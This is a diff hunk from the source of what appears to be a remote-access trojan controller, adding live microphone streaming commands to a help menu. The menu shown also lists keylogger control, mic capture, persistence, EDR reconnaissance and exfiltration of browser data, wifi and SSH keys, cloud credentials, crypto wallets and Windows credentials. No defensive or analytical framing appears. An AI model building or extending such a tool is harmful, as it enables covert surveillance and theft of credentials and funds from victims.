@@ -225,6 +225,8 @@ Commands:
   find <id> <path>;<mask>        - find files
   keys/k <id> {start|stop}       - keylogger control
   mic/m <id> [seconds]           - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav
+  listen <id>                    - start live mic stream -> downloads/mic_live_<ts>.wav (open in ffplay/vlc)
+  unlisten <id>                  - stop live mic stream and finalize file
   persist/p <id>                 - re-establish persistence
   exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds
   recon <id> <kind>              - edr|shares|software|usb|tasks
